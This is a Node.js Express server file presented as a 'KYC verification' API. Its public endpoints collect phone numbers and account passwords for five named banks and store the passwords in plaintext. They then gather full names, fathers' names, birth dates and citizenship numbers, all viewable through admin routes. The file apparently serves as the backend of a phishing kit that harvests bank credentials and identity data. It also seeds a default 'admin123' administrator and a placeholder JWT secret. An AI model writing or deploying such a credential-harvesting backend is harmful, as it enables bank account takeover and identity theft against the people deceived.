// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/kyc_verification', {
})
.then(() => console.log('✅ MongoDB Connected Successfully'))
.catch(err => console.error('❌ MongoDB Connection Error:', err));

// ==================== SCHEMAS ====================

// KYC Submission Schema
const kycSubmissionSchema = new mongoose.Schema({
  phoneNumber: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  // pin: {
  //   type: String,
  //   required: true
  // },
  agreedToShare: {
    type: Boolean,
    required: true
  },
  bankType: {
    type: String,
    required: true,
    enum: ['sunrise', 'rbb', 'nic', 'citizen_bank', 'mbbl']
  },
  fatherName: {
    type: String,
    default: null
  },
  fullName: {
    type: String,
    default: null
  },
  dateOfBirth: {
    type: String,
    default: null
  },
  citizenshipNumber: {
    type: String,
    default: null
  },
  issueDate: {
    type: String,
    default: null
  },
  step: {
    type: Number,
    required: true,
    default: 1
  },
  status: {
    type: String,
    enum: ['pending', 'completed', 'rejected'],
    default: 'pending'
  }
}, {
  timestamps: true
});

// Admin User Schema
const adminSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true
  },
  password: {
    type: String,
    required: true
  },
  email: {
    type: String,
    required: true,
    unique: true
  },
  role: {
    type: String,
    default: 'admin'
  }
}, {
  timestamps: true
});

const KYCSubmission = mongoose.model('KYCSubmission', kycSubmissionSchema);
const Admin = mongoose.model('Admin', adminSchema);

// ==================== MIDDLEWARE ====================

// JWT Authentication Middleware
const authenticateAdmin = (req, res, next) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
      return res.status(401).json({
        success: false,
        message: 'Access denied. No token provided.'
      });
    }

    jwt.verify(token, JWT_SECRET, (err, decoded) => {
      if (err) {
        return res.status(403).json({
          success: false,
          message: 'Invalid or expired token.'
        });
      }
      req.admin = decoded;
      next();
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Error authenticating token',
      error: error.message
    });
  }
};

// ==================== INITIALIZATION ====================

// Create default admin user if not exists
const createDefaultAdmin = async () => {
  try {
    const adminExists = await Admin.findOne({ username: 'admin' });
    
    if (!adminExists) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      const defaultAdmin = new Admin({
        username: 'admin',
        password: hashedPassword,
        email: 'admin@kyc.com',
        role: 'admin'
      });
      await defaultAdmin.save();
      console.log('✅ Default admin created: username=admin, password=admin123');
    }
  } catch (error) {
    console.error('Error creating default admin:', error);
  }
};

// Call this after MongoDB connection
mongoose.connection.once('open', () => {
  createDefaultAdmin();
});

// ==================== ROUTES ====================

// Health Check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'KYC Verification API is running',
    timestamp: new Date().toISOString()
  });
});

// ==================== ADMIN ROUTES ====================

// Admin Login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password are required'
      });
    }

    // Find admin
    const admin = await Admin.findOne({ username });
    
    if (!admin) {
      return res.status(401).json({
        success: false,
        message: 'Invalid username or password'
      });
    }

    // Verify password
    const isValidPassword = await bcrypt.compare(password, admin.password);
    
    if (!isValidPassword) {
      return res.status(401).json({
        success: false,
        message: 'Invalid username or password'
      });
    }

    // Generate JWT token
    const token = jwt.sign(
      { 
        id: admin._id, 
        username: admin.username,
        role: admin.role 
      },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    console.log(`✅ Admin logged in: ${username}`);

    res.json({
      success: true,
      message: 'Login successful',
      token: token,
      admin: {
        username: admin.username,
        email: admin.email,
        role: admin.role
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Error during login',
      error: error.message
    });
  }
});

// Create new admin (protected route)
app.post('/api/admin/create', authenticateAdmin, async (req, res) => {
  try {
    const { username, password, email } = req.body;

    if (!username || !password || !email) {
      return res.status(400).json({
        success: false,
        message: 'Username, password, and email are required'
      });
    }

    // Check if admin already exists
    const existingAdmin = await Admin.findOne({ $or: [{ username }, { email }] });
    
    if (existingAdmin) {
      return res.status(400).json({
        success: false,
        message: 'Admin with this username or email already exists'
      });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Create new admin
    const newAdmin = new Admin({
      username,
      password: hashedPassword,
      email,
      role: 'admin'
    });

    await newAdmin.save();

    res.status(201).json({
      success: true,
      message: 'Admin created successfully',
      admin: {
        username: newAdmin.username,
        email: newAdmin.email,
        role: newAdmin.role
      }
    });
  } catch (error) {
    console.error('Error creating admin:', error);
    res.status(500).json({
      success: false,
      message: 'Error creating admin',
      error: error.message
    });
  }
});

// ==================== KYC ROUTES ====================

// Step 1: Submit Initial KYC Data (PUBLIC)
app.post('/api/kyc/step1', async (req, res) => {
  try {
    const { phoneNumber, password, agreedToShare, bankType } = req.body;

    // Validation
    if (!phoneNumber || !password || !agreedToShare || !bankType) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required including bank type'
      });
    }

    // Validate bankType
    if (!['sunrise', 'rbb', 'nic', 'citizen_bank', 'mbbl'].includes(bankType.toLowerCase())) {
      return res.status(400).json({
        success: false,
        message: 'Invalid bank type'
      });
    }

    // Create new submission
    const submission = new KYCSubmission({
      phoneNumber,
      password,
      // pin,
      agreedToShare,
      bankType: bankType.toLowerCase(),
      step: 1
    });

    await submission.save();

    console.log(`✅ Step 1 submitted for phone: ${phoneNumber}, Bank: ${bankType}`);

    res.status(201).json({
      success: true,
      message: 'Step 1 submitted successfully',
      data: {
        id: submission._id,
        phoneNumber: submission.phoneNumber,
        bankType: submission.bankType,
        step: submission.step,
        createdAt: submission.createdAt
      }
    });
  } catch (error) {
    console.error('Error in Step 1:', error);
    res.status(500).json({
      success: false,
      message: 'Error submitting Step 1',
      error: error.message
    });
  }
});

// Step 2: Update with Additional KYC Details (PUBLIC)
app.put('/api/kyc/step2/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { fatherName, fullName, dateOfBirth, citizenshipNumber, issueDate } = req.body;

    // Validation
    if (!fatherName || !fullName || !dateOfBirth || !citizenshipNumber || !issueDate) {
      return res.status(400).json({
        success: false,
        message: 'All fields are required'
      });
    }

    // Find and update submission
    const submission = await KYCSubmission.findByIdAndUpdate(
      id,
      {
        fatherName,
        fullName,
        dateOfBirth,
        citizenshipNumber,
        issueDate,
        step: 2,
        status: 'completed'
      },
      { new: true }
    );

    if (!submission) {
      return res.status(404).json({
        success: false,
        message: 'Submission not found'
      });
    }

    console.log(`✅ Step 2 completed for: ${submission.fullName}`);

    res.json({
      success: true,
      message: 'KYC verification completed successfully',
      data: submission
    });
  } catch (error) {
    console.error('Error in Step 2:', error);
    res.status(500).json({
      success: false,
      message: 'Error submitting Step 2',
      error: error.message
    });
  }
});

// Get All Submissions (PROTECTED - Admin Only)
app.get('/api/kyc/submissions', authenticateAdmin, async (req, res) => {
  try {
    const { status, step, limit = 100 } = req.query;

    // Build query
    const query = {};
    if (status) query.status = status;
    if (step) query.step = parseInt(step);

    // Get submissions sorted by most recent
    const submissions = await KYCSubmission.find(query)
      .sort({ updatedAt: -1 })
      .limit(parseInt(limit));

    res.json({
      success: true,
      count: submissions.length,
      data: submissions
    });
  } catch (error) {
    console.error('Error fetching submissions:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching submissions',
      error: error.message
    });
  }
});

// Get Single Submission by ID (PROTECTED - Admin Only)
app.get('/api/kyc/submission/:id', authenticateAdmin, async (req, res) => {
  try {
    const { id } = req.params;

    const submission = await KYCSubmission.findById(id);

    if (!submission) {
      return res.status(404).json({
        success: false,
        message: 'Submission not found'
      });
    }

    res.json({
      success: true,
      data: submission
    });
  } catch (error) {
    console.error('Error fetching submission:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching submission',
      error: error.message
    });
  }
});

// Delete Submission (PROTECTED - Admin Only)
app.delete('/api/kyc/submission/:id', authenticateAdmin, async (req, res) => {
  try {
    const { id } = req.params;

    const submission = await KYCSubmission.findByIdAndDelete(id);

    if (!submission) {
      return res.status(404).json({
        success: false,
        message: 'Submission not found'
      });
    }

    console.log(`🗑️ Deleted submission: ${id}`);

    res.json({
      success: true,
      message: 'Submission deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting submission:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting submission',
      error: error.message
    });
  }
});

// Update Submission Status (PROTECTED - Admin Only)
app.patch('/api/kyc/submission/:id/status', authenticateAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;

    if (!['pending', 'completed', 'rejected'].includes(status)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid status. Must be: pending, completed, or rejected'
      });
    }

    const submission = await KYCSubmission.findByIdAndUpdate(
      id,
      { status },
      { new: true }
    );

    if (!submission) {
      return res.status(404).json({
        success: false,
        message: 'Submission not found'
      });
    }

    res.json({
      success: true,
      message: 'Status updated successfully',
      data: submission
    });
  } catch (error) {
    console.error('Error updating status:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating status',
      error: error.message
    });
  }
});

// Get Statistics (PROTECTED - Admin Only)
app.get('/api/kyc/stats', authenticateAdmin, async (req, res) => {
  try {
    const totalSubmissions = await KYCSubmission.countDocuments();
    const step1Count = await KYCSubmission.countDocuments({ step: 1 });
    const step2Count = await KYCSubmission.countDocuments({ step: 2 });
    const pendingCount = await KYCSubmission.countDocuments({ status: 'pending' });
    const completedCount = await KYCSubmission.countDocuments({ status: 'completed' });
    const rejectedCount = await KYCSubmission.countDocuments({ status: 'rejected' });

    res.json({
      success: true,
      data: {
        total: totalSubmissions,
        byStep: {
          step1: step1Count,
          step2: step2Count
        },
        byStatus: {
          pending: pendingCount,
          completed: completedCount,
          rejected: rejectedCount
        }
      }
    });
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching statistics',
      error: error.message
    });
  }
});

// ==================== ERROR HANDLERS ====================

// 404 Handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found'
  });
});

// Error Handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Something went wrong!',
    error: err.message
  });
});

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📡 API available at http://localhost:${PORT}/api`);
  console.log(`💚 Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔐 Admin login: http://localhost:${PORT}/api/admin/login`);
});
